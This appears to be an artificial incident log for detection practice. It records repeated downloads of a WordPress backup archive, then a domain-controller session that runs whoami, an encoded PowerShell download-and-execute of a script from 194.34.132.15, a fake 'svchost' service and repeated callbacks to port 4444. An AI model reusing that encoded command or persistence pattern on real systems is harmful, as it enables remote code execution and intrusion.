+2025-06-10 18:00:22,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:22 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:23,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:23 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:24,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:24 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:25,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:25 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:26,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:26 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:27,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:27 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:28,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:28 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:29,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:29 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:30,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:30 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:31,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:31 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:32,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:32 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:33,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:33 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:34,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:34 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:35,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:35 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:36,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:36 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:37,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:37 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:38,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:38 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:39,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:39 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:40,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:40 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:41,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:41 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:42,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:42 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:43,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:43 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:44,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:44 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:45,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:45 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:46,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:46 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:47,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:47 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:48,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:48 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:49,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:49 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:50,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:50 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:51,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:51 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:52,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:52 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:53,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:53 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:54,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:54 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:55,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:55 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:56,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:56 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:57,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:57 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:58,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:58 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:59,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:59 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:00,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:00 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:01,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:01 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:02,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:03,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:04,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:05,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:06,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:07,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:08,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:09,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:10,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:11,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:12,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:13,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:14,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:15,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:16,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:17,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:18,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:19,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:20,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:21,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:21 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:22,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:22 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:23,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:23 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:24,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:24 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:25,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:25 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:26,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:26 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:27,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:27 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:28,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:28 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:29,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:29 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:01:30,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:01:30 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 20:00:00,192.168.1.100,DC-01,Security,4624,Logon Type 10,User: maryam,Source IP: 192.168.1.100,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 20:00:01,192.168.1.100,DC-01,Security,4672,Special Privileges,User: maryam
+2025-06-10 20:00:02,192.168.1.100,DC-01,Security,4688,Process Create,Image: C:\Windows\System32\cmd.exe,Command: cmd.exe /c whoami,Parent: explorer.exe
+2025-06-10 20:00:03,192.168.1.100,DC-01,Security,4688,Process Create,Image: C:\Windows\System32\powershell.exe,Command: powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQAvAG4AZQB0AFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAzADQALgAxADMAMgAuADEANQA6ADgAMAA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAAgACgAKQA=,Parent: cmd.exe
+2025-06-10 20:00:04,192.168.1.100,DC-01,Security,7045,Service Created,Service Name: SysUpdate,Image Path: C:\ProgramData\svchost.exe,Start Type: Auto
+2025-06-10 20:00:05,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:06,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:07,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:08,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:09,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:10,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:11,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:12,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:13,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:14,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:15,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:16,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:17,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:18,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:19,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:20,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:21,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:22,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:23,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:24,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:25,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:26,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:27,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:28,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:29,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:30,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:31,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:32,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:33,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:34,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:35,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:36,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:37,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:38,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:39,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:40,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:41,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:42,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:43,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:44,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:45,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:46,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
